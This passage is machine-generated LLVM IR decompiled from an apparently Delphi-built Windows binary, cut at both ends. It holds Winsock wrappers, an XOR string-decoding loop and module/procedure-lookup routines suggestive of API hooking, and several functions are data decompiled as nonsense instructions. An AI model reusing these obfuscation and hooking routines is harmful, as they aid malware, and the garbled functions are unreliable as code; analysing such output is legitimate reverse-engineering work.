  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !224
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !225
  %2 = load i32, i32* @global_var_409664, align 4, !insn.addr !226
  %3 = add i32 %2, 1, !insn.addr !226
  store i32 %3, i32* @global_var_409664, align 4, !insn.addr !226
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !227
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !228
  ret i32 0, !insn.addr !229
}

define i32 @function_404665() local_unnamed_addr {
dec_label_pc_404665:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !230
  ret i32 %0, !insn.addr !230
}

define i32 @function_40466a() local_unnamed_addr {
dec_label_pc_40466a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !231
}

define i32 @function_40466c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40466c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !232
}

define i32 @function_404670() local_unnamed_addr {
dec_label_pc_404670:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409664, align 4, !insn.addr !233
  %2 = add i32 %1, -1, !insn.addr !233
  store i32 %2, i32* @global_var_409664, align 4, !insn.addr !233
  ret i32 %0, !insn.addr !234
}

define i32 @function_40467b() local_unnamed_addr {
dec_label_pc_40467b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %1, -1, !insn.addr !235
  %4 = inttoptr i32 %1 to i32*, !insn.addr !235
  store i32 %3, i32* %4, align 4, !insn.addr !235
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !236
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !236
  %9 = add i8 %6, %8, !insn.addr !236
  %10 = inttoptr i32 %7 to i8*, !insn.addr !236
  store i8 %9, i8* %10, align 1, !insn.addr !236
  %11 = add i32 %2, 101, !insn.addr !237
  %12 = inttoptr i32 %11 to i8*, !insn.addr !237
  %13 = load i8, i8* %12, align 1, !insn.addr !237
  %14 = udiv i32 %2, 256, !insn.addr !237
  %15 = trunc i32 %14 to i8, !insn.addr !237
  %16 = add i8 %13, %15, !insn.addr !237
  store i8 %16, i8* %12, align 1, !insn.addr !237
  %17 = add i32 %1, 101, !insn.addr !238
  %18 = inttoptr i32 %17 to i32*, !insn.addr !238
  %19 = load i32, i32* %18, align 4, !insn.addr !238
  %20 = mul i32 %19, 1819042862, !insn.addr !238
  %21 = load i8, i8* %5, align 4, !insn.addr !239
  %22 = load i32, i32* %eax, align 4
  %23 = trunc i32 %22 to i8, !insn.addr !239
  %24 = add i8 %21, %23, !insn.addr !239
  %25 = inttoptr i32 %22 to i8*, !insn.addr !239
  store i8 %24, i8* %25, align 1, !insn.addr !239
  %26 = load i8, i8* %5, align 4, !insn.addr !240
  %27 = load i32, i32* %eax, align 4
  %28 = trunc i32 %27 to i8, !insn.addr !240
  %29 = add i8 %26, %28, !insn.addr !240
  %30 = inttoptr i32 %27 to i8*, !insn.addr !240
  store i8 %29, i8* %30, align 1, !insn.addr !240
  %31 = load i8, i8* %5, align 4, !insn.addr !241
  %32 = load i32, i32* %eax, align 4
  %33 = trunc i32 %32 to i8, !insn.addr !241
  %34 = add i8 %31, %33, !insn.addr !241
  %35 = inttoptr i32 %32 to i8*, !insn.addr !241
  store i8 %34, i8* %35, align 1, !insn.addr !241
  %36 = load i8, i8* %5, align 4, !insn.addr !242
  %37 = load i32, i32* %eax, align 4
  %38 = trunc i32 %37 to i8, !insn.addr !242
  %39 = add i8 %36, %38, !insn.addr !242
  %40 = inttoptr i32 %37 to i8*, !insn.addr !242
  store i8 %39, i8* %40, align 1, !insn.addr !242
  %41 = add i32 %0, -117, !insn.addr !243
  %42 = inttoptr i32 %41 to i8*, !insn.addr !243
  %43 = load i8, i8* %42, align 1, !insn.addr !243
  %44 = trunc i32 %2 to i8, !insn.addr !243
  %45 = add i8 %43, %44, !insn.addr !243
  store i8 %45, i8* %42, align 1, !insn.addr !243
  %46 = trunc i32 %2 to i16, !insn.addr !244
  %47 = call i8 @__asm_in(i16 %46), !insn.addr !244
  %48 = add i32 %20, -8, !insn.addr !245
  %49 = inttoptr i32 %48 to i32*, !insn.addr !245
  store i32 4212461, i32* %49, align 4, !insn.addr !245
  %50 = call i32 @__readfsdword(i32 0), !insn.addr !246
  %51 = add i32 %20, -12, !insn.addr !246
  %52 = inttoptr i32 %51 to i32*, !insn.addr !246
  store i32 %50, i32* %52, align 4, !insn.addr !246
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !247
  %53 = load i32, i32* @global_var_409678, align 4, !insn.addr !248
  %54 = add i32 %53, 1, !insn.addr !248
  %55 = icmp eq i32 %54, 0, !insn.addr !248
  store i32 %54, i32* @global_var_409678, align 4, !insn.addr !248
  %56 = icmp eq i1 %55, false, !insn.addr !249
  br i1 %56, label %dec_label_pc_4046df, label %dec_label_pc_4046ad, !insn.addr !249

dec_label_pc_4046ad:                              ; preds = %dec_label_pc_40467b
  %57 = call i32 @"@LStrClr"(), !insn.addr !250
  %58 = call i32 @"@LStrClr"(), !insn.addr !251
  %59 = call i32 @"@LStrClr"(), !insn.addr !252
  %60 = call i32 @"@LStrClr"(), !insn.addr !253
  %61 = call i32 @"@LStrClr"(), !insn.addr !254
  br label %dec_label_pc_4046df, !insn.addr !254

dec_label_pc_4046df:                              ; preds = %dec_label_pc_4046ad, %dec_label_pc_40467b
  %62 = add i32 %20, -4, !insn.addr !255
  %63 = inttoptr i32 %62 to i32*, !insn.addr !255
  %64 = load i32, i32* %52, align 4, !insn.addr !256
  call void @__writefsdword(i32 0, i32 %64), !insn.addr !257
  store i32 4212468, i32* %63, align 4, !insn.addr !258
  ret i32 0, !insn.addr !259
}

define i32 @function_4046ed() local_unnamed_addr {
dec_label_pc_4046ed:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !260
  ret i32 %0, !insn.addr !260
}

define i32 @function_4046f2() local_unnamed_addr {
dec_label_pc_4046f2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !261
}

define i32 @function_4046f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4046f4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !262
}

define i32 @function_4046f8() local_unnamed_addr {
dec_label_pc_4046f8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409678, align 4, !insn.addr !263
  %2 = add i32 %1, -1, !insn.addr !263
  store i32 %2, i32* @global_var_409678, align 4, !insn.addr !263
  ret i32 %0, !insn.addr !264
}

define i32 @function_404700() local_unnamed_addr {
dec_label_pc_404700:
  %eax.1.reg2mem = alloca i32, !insn.addr !265
  %esi.0.reg2mem = alloca i32, !insn.addr !265
  %ebx.0.reg2mem = alloca i32, !insn.addr !265
  %eax.0.reg2mem = alloca i32, !insn.addr !265
  %0 = call i32 @function_40374c(), !insn.addr !266
  %1 = call i32 @function_4034f4(), !insn.addr !267
  %2 = icmp slt i32 %1, 1
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !268
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !268
  store i32 %0, i32* %esi.0.reg2mem, !insn.addr !268
  store i32 %1, i32* %eax.1.reg2mem, !insn.addr !268
  br i1 %2, label %dec_label_pc_404735, label %dec_label_pc_40471b, !insn.addr !268

dec_label_pc_40471b:                              ; preds = %dec_label_pc_404700, %dec_label_pc_40471b
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %3 = add i32 %ebx.0.reload, ptrtoint ([12 x i8]* @global_var_4080d0 to i32), !insn.addr !269
  %4 = inttoptr i32 %3 to i8*, !insn.addr !269
  %5 = load i8, i8* %4, align 1, !insn.addr !269
  %6 = inttoptr i32 %esi.0.reload to i8*, !insn.addr !270
  %7 = load i8, i8* %6, align 1, !insn.addr !270
  %8 = xor i8 %7, %5, !insn.addr !270
  store i8 %8, i8* %6, align 1, !insn.addr !270
  %9 = add i32 %esi.0.reload, 1, !insn.addr !271
  %10 = add i32 %ebx.0.reload, 1, !insn.addr !272
  %11 = and i32 %10, -2147483641, !insn.addr !273
  %12 = icmp slt i32 %11, 0, !insn.addr !273
  %13 = icmp eq i1 %12, false, !insn.addr !274
  %14 = or i32 %ebx.0.reload, -8
  %15 = add nsw i32 %14, 1
  %ebx.1 = select i1 %13, i32 %11, i32 %15
  %16 = add i32 %eax.0.reload, -1, !insn.addr !275
  %17 = icmp eq i32 %16, 0, !insn.addr !275
  %18 = icmp eq i1 %17, false, !insn.addr !276
  store i32 %16, i32* %eax.0.reg2mem, !insn.addr !276
  store i32 %ebx.1, i32* %ebx.0.reg2mem, !insn.addr !276
  store i32 %9, i32* %esi.0.reg2mem, !insn.addr !276
  store i32 %16, i32* %eax.1.reg2mem, !insn.addr !276
  br i1 %18, label %dec_label_pc_40471b, label %dec_label_pc_404735, !insn.addr !276

dec_label_pc_404735:                              ; preds = %dec_label_pc_40471b, %dec_label_pc_404700
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !277
}

define i32 @function_40473c() local_unnamed_addr {
dec_label_pc_40473c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !278
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !278
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !278
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !279
  %2 = load i32, i32* @global_var_40967c, align 4, !insn.addr !280
  %3 = add i32 %2, 1, !insn.addr !280
  store i32 %3, i32* @global_var_40967c, align 4, !insn.addr !280
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !281
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !282
  ret i32 0, !insn.addr !283
}

define i32 @function_404761() local_unnamed_addr {
dec_label_pc_404761:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !284
  ret i32 %0, !insn.addr !284
}

define i32 @function_404766() local_unnamed_addr {
dec_label_pc_404766:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !285
}

define i32 @function_404768(i32 %arg1) local_unnamed_addr {
dec_label_pc_404768:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !286
}

define i32 @function_40476c() local_unnamed_addr {
dec_label_pc_40476c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40967c, align 4, !insn.addr !287
  %2 = add i32 %1, -1, !insn.addr !287
  store i32 %2, i32* @global_var_40967c, align 4, !insn.addr !287
  ret i32 %0, !insn.addr !288
}

define i32 @function_404774() local_unnamed_addr {
dec_label_pc_404774:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !289
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !289
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !289
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !290
  %2 = load i32, i32* @global_var_409680, align 4, !insn.addr !291
  %3 = add i32 %2, 1, !insn.addr !291
  store i32 %3, i32* @global_var_409680, align 4, !insn.addr !291
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !292
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !293
  ret i32 0, !insn.addr !294
}

define i32 @function_404799() local_unnamed_addr {
dec_label_pc_404799:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !295
  ret i32 %0, !insn.addr !295
}

define i32 @function_40479e() local_unnamed_addr {
dec_label_pc_40479e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !296
}

define i32 @function_4047a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4047a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !297
}

define i32 @function_4047a4() local_unnamed_addr {
dec_label_pc_4047a4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409680, align 4, !insn.addr !298
  %2 = add i32 %1, -1, !insn.addr !298
  store i32 %2, i32* @global_var_409680, align 4, !insn.addr !298
  ret i32 %0, !insn.addr !299
}

define i32 @function_4047ac(i32 %s) local_unnamed_addr {
dec_label_pc_4047ac:
  %0 = call i32 @closesocket(i32 %s), !insn.addr !300
  ret i32 %0, !insn.addr !300
}

define i32 @function_4047b4(i32 %s, %sockaddr* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047b4:
  %0 = call i32 @connect(i32 %s, %sockaddr* %name, i32 %namelen), !insn.addr !301
  ret i32 %0, !insn.addr !301
}

define i16 @function_4047bc(i16 %hostshort) local_unnamed_addr {
dec_label_pc_4047bc:
  %0 = call i16 @htons(i16 %hostshort), !insn.addr !302
  ret i16 %0, !insn.addr !302
}

define i8* @function_4047c4(%in_addr %in) local_unnamed_addr {
dec_label_pc_4047c4:
  %0 = call i8* @inet_ntoa(%in_addr %in), !insn.addr !303
  ret i8* %0, !insn.addr !303
}

define i32 @function_4047cc(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047cc:
  %0 = call i32 @recv(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !304
  ret i32 %0, !insn.addr !304
}

define i32 @function_4047d4(i32 %s, i8* %buf, i32 %len, i32 %flags) local_unnamed_addr {
dec_label_pc_4047d4:
  %0 = call i32 @send(i32 %s, i8* %buf, i32 %len, i32 %flags), !insn.addr !305
  ret i32 %0, !insn.addr !305
}

define i32 @function_4047dc(i32 %af, i32 %type, i32 %protocol) local_unnamed_addr {
dec_label_pc_4047dc:
  %0 = call i32 @socket(i32 %af, i32 %type, i32 %protocol), !insn.addr !306
  ret i32 %0, !insn.addr !306
}

define %hostent* @function_4047e4(i8* %name) local_unnamed_addr {
dec_label_pc_4047e4:
  %0 = call %hostent* @gethostbyname(i8* %name), !insn.addr !307
  ret %hostent* %0, !insn.addr !307
}

define i32 @function_4047ec(i8* %name, i32 %namelen) local_unnamed_addr {
dec_label_pc_4047ec:
  %0 = call i32 @gethostname(i8* %name, i32 %namelen), !insn.addr !308
  ret i32 %0, !insn.addr !308
}

define i32 @function_4047f4(i16 %wVersionRequested, %WSAData* %lpWSAData) local_unnamed_addr {
dec_label_pc_4047f4:
  %0 = call i32 @WSAStartup(i16 %wVersionRequested, %WSAData* %lpWSAData), !insn.addr !309
  ret i32 %0, !insn.addr !309
}

define i32 @function_4047fc() local_unnamed_addr {
dec_label_pc_4047fc:
  %0 = call i32 @WSACleanup(), !insn.addr !310
  ret i32 %0, !insn.addr !310
}

define i32 @function_404804() local_unnamed_addr {
dec_label_pc_404804:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !311
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !311
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !311
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !312
  %2 = load i32, i32* @global_var_409684, align 4, !insn.addr !313
  %3 = add i32 %2, 1, !insn.addr !313
  store i32 %3, i32* @global_var_409684, align 4, !insn.addr !313
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !314
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !315
  ret i32 0, !insn.addr !316
}

define i32 @function_404829() local_unnamed_addr {
dec_label_pc_404829:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !317
  ret i32 %0, !insn.addr !317
}

define i32 @function_40482e() local_unnamed_addr {
dec_label_pc_40482e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !318
}

define i32 @function_404830(i32 %arg1) local_unnamed_addr {
dec_label_pc_404830:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !319
}

define i32 @function_404834() local_unnamed_addr {
dec_label_pc_404834:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409684, align 4, !insn.addr !320
  %2 = add i32 %1, -1, !insn.addr !320
  store i32 %2, i32* @global_var_409684, align 4, !insn.addr !320
  ret i32 %0, !insn.addr !321
}

define i32 @function_40483c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40483c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2
  %3 = inttoptr i32 %0 to i8*
  store i8 %2, i8* %3, align 1
  ret i32 %0, !insn.addr !322
}

define i32 @function_4049f9() local_unnamed_addr {
dec_label_pc_4049f9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !323
  ret i32 %0, !insn.addr !323
}

define i32 @function_4049fe() local_unnamed_addr {
dec_label_pc_4049fe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !324
}

define i32 @function_404a00(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a00:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !325
}

define i32 @function_404a04() local_unnamed_addr {
dec_label_pc_404a04:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !326
  %2 = add i32 %1, -1, !insn.addr !326
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !326
  ret i32 %0, !insn.addr !327
}

define i32* @function_404a0c(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !328
  ret i32* %0, !insn.addr !328
}

define i32 @function_404a16() local_unnamed_addr {
dec_label_pc_404a16:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %0 to i16, !insn.addr !329
  %3 = call i8 @__asm_in(i16 %2), !insn.addr !329
  %4 = sext i8 %3 to i32, !insn.addr !329
  %5 = and i32 %1, -256, !insn.addr !329
  %6 = or i32 %5, %4, !insn.addr !329
  ret i32 %6, !insn.addr !329
}

define i32 @function_404a18() local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404a1a(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a1a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 %0), !insn.addr !330
  store i32 %1, i32* %stack_var_-8, align 4, !insn.addr !330
  %2 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !330
  call void @__writefsdword(i32 %0, i32 %2), !insn.addr !331
  %3 = load i32, i32* @global_var_40968c, align 4, !insn.addr !332
  %4 = add i32 %3, 1, !insn.addr !332
  store i32 %4, i32* @global_var_40968c, align 4, !insn.addr !332
  %5 = load i32, i32* %stack_var_-8, align 4, !insn.addr !333
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !334
  ret i32 0, !insn.addr !335
}

define i32 @function_404a39() local_unnamed_addr {
dec_label_pc_404a39:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !336
  ret i32 %0, !insn.addr !336
}

define i32 @function_404a3e() local_unnamed_addr {
dec_label_pc_404a3e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !337
}

define i32 @function_404a40(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !338
}

define i32 @function_404a44() local_unnamed_addr {
dec_label_pc_404a44:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !339
  %2 = add i32 %1, -1, !insn.addr !339
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !339
  ret i32 %0, !insn.addr !340
}

define i32 @function_404aa4(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404aa4:
  %esp.1.reg2mem = alloca i32, !insn.addr !341
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !341
  %eax.0.reg2mem = alloca i32, !insn.addr !341
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !342
  %7 = icmp eq i8 %6, 0, !insn.addr !342
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !343
  br i1 %7, label %dec_label_pc_404ab7, label %dec_label_pc_404aaf, !insn.addr !343

dec_label_pc_404aaf:                              ; preds = %dec_label_pc_404aa4
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !344
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !344
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !344
  br label %dec_label_pc_404ab7, !insn.addr !344

dec_label_pc_404ab7:                              ; preds = %dec_label_pc_404aaf, %dec_label_pc_404aa4
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !345
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !346
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !346
  %13 = ptrtoint i32* %12 to i32, !insn.addr !346
  %14 = add i32 %eax.0.reload, 8, !insn.addr !347
  %15 = inttoptr i32 %14 to i32*, !insn.addr !347
  store i32 %13, i32* %15, align 4, !insn.addr !347
  %16 = icmp eq i32* %12, null, !insn.addr !348
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !349
  br i1 %16, label %dec_label_pc_404b0f, label %dec_label_pc_404ad3, !insn.addr !349

dec_label_pc_404ad3:                              ; preds = %dec_label_pc_404ab7
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !350
  %18 = add i32 %eax.0.reload, 12, !insn.addr !351
  %19 = inttoptr i32 %18 to i32*, !insn.addr !351
  store i32 %17, i32* %19, align 4, !insn.addr !351
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !352
  %21 = add i32 %eax.0.reload, 16, !insn.addr !353
  %22 = inttoptr i32 %21 to i32*, !insn.addr !353
  store i32 %20, i32* %22, align 4, !insn.addr !353
  %23 = add i32 %eax.0.reload, 20, !insn.addr !354
  %24 = inttoptr i32 %23 to i32*, !insn.addr !354
  store i32 %arg3, i32* %24, align 4, !insn.addr !354
  %25 = load i32, i32* %22, align 4, !insn.addr !355
  %26 = add i32 %esp.0, -8, !insn.addr !356
  %27 = inttoptr i32 %26 to i32*, !insn.addr !356
  store i32 %25, i32* %27, align 4, !insn.addr !356
  %28 = add i32 %esp.0, -12, !insn.addr !357
  %29 = inttoptr i32 %28 to i32*, !insn.addr !357
  store i32 %17, i32* %29, align 4, !insn.addr !357
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !358
  %31 = ptrtoint i32* %30 to i32, !insn.addr !358
  %32 = add i32 %esp.0, -16, !insn.addr !359
  %33 = inttoptr i32 %32 to i32*, !insn.addr !359
  store i32 %31, i32* %33, align 4, !insn.addr !359
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !360
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !360
  %36 = add i32 %eax.0.reload, 24, !insn.addr !361
  %37 = inttoptr i32 %36 to i32*, !insn.addr !361
  store i32 %35, i32* %37, align 4, !insn.addr !361
  %38 = icmp eq i32 ()* %34, null, !insn.addr !362
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !363
  br i1 %38, label %dec_label_pc_404b0f, label %dec_label_pc_404afb, !insn.addr !363

dec_label_pc_404afb:                              ; preds = %dec_label_pc_404ad3
  %39 = load i32, i32* %24, align 4, !insn.addr !364
  %40 = add i32 %esp.0, -20, !insn.addr !365
  %41 = inttoptr i32 %40 to i32*, !insn.addr !365
  store i32 %39, i32* %41, align 4, !insn.addr !365
  %42 = load i32, i32* %15, align 4, !insn.addr !366
  %43 = add i32 %esp.0, -24, !insn.addr !367
  %44 = inttoptr i32 %43 to i32*, !insn.addr !367
  store i32 %42, i32* %44, align 4, !insn.addr !367
  %45 = call i32 @function_404b78(i32 ptrtoint (i32* @0 to i32)), !insn.addr !368
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !368
  br label %dec_label_pc_404b0f, !insn.addr !368

dec_label_pc_404b0f:                              ; preds = %dec_label_pc_404afb, %dec_label_pc_404ad3, %dec_label_pc_404ab7
  br i1 %7, label %dec_label_pc_404b26, label %dec_label_pc_404b17, !insn.addr !369

dec_label_pc_404b17:                              ; preds = %dec_label_pc_404b0f
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !370
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !371
  %48 = load i32, i32* %47, align 4, !insn.addr !371
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !371
  br label %dec_label_pc_404b26, !insn.addr !372

dec_label_pc_404b26:                              ; preds = %dec_label_pc_404b17, %dec_label_pc_404b0f
  %49 = add i32 %eax.0.reload, 4, !insn.addr !373
  %50 = inttoptr i32 %49 to i32*, !insn.addr !373
  %51 = inttoptr i32 %9 to i32*, !insn.addr !345
  ret i32 %eax.0.reload, !insn.addr !374
}

define i32 @function_404b30() local_unnamed_addr {
dec_label_pc_404b30:
  %eax.1.reg2mem = alloca i32, !insn.addr !375
  %eax.0.reg2mem = alloca i32, !insn.addr !375
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !376
  %4 = add i32 %3, 8, !insn.addr !377
  %5 = inttoptr i32 %4 to i32*, !insn.addr !377
  %6 = load i32, i32* %5, align 4, !insn.addr !377
  %7 = icmp eq i32 %6, 0, !insn.addr !377
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !378
  br i1 %7, label %dec_label_pc_404b6a, label %dec_label_pc_404b41, !insn.addr !378

dec_label_pc_404b41:                              ; preds = %dec_label_pc_404b30
  %8 = add i32 %3, 24, !insn.addr !379
  %9 = inttoptr i32 %8 to i32*, !insn.addr !379
  %10 = load i32, i32* %9, align 4, !insn.addr !379
  %11 = icmp eq i32 %10, 0, !insn.addr !379
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !380
  br i1 %11, label %dec_label_pc_404b6a, label %dec_label_pc_404b47, !insn.addr !380

dec_label_pc_404b47:                              ; preds = %dec_label_pc_404b41
  %12 = add i32 %3, 4, !insn.addr !381
  %13 = inttoptr i32 %12 to i32*, !insn.addr !381
  %14 = load i32, i32* %13, align 4, !insn.addr !381
  %15 = inttoptr i32 %14 to i8*, !insn.addr !382
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !383
  %17 = ptrtoint i32* %16 to i32, !insn.addr !383
  %18 = load i32, i32* %5, align 4, !insn.addr !384
  %19 = icmp eq i32 %18, %17, !insn.addr !384
  %20 = icmp eq i1 %19, false, !insn.addr !385
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !385
  br i1 %20, label %dec_label_pc_404b6a, label %dec_label_pc_404b55, !insn.addr !385

dec_label_pc_404b55:                              ; preds = %dec_label_pc_404b47
  %21 = load i32, i32* %9, align 4, !insn.addr !386
  %22 = call i32 @function_404b78(i32 %21), !insn.addr !387
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !387
  br label %dec_label_pc_404b6a, !insn.addr !387

dec_label_pc_404b6a:                              ; preds = %dec_label_pc_404b55, %dec_label_pc_404b47, %dec_label_pc_404b41, %dec_label_pc_404b30
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !388
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !389
  br i1 %24, label %dec_label_pc_404b75, label %dec_label_pc_404b6e, !insn.addr !389

dec_label_pc_404b6e:                              ; preds = %dec_label_pc_404b6a
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !390
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !390
  br label %dec_label_pc_404b75, !insn.addr !390

dec_label_pc_404b75:                              ; preds = %dec_label_pc_404b6e, %dec_label_pc_404b6a
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !391
}

define i32 @function_404b78(i32 %arg1) local_unnamed_addr {
dec_label_pc_404b78:
  %eax.0.reg2mem = alloca i32, !insn.addr !392
  %esp.0.reg2mem = alloca i32, !insn.addr !392
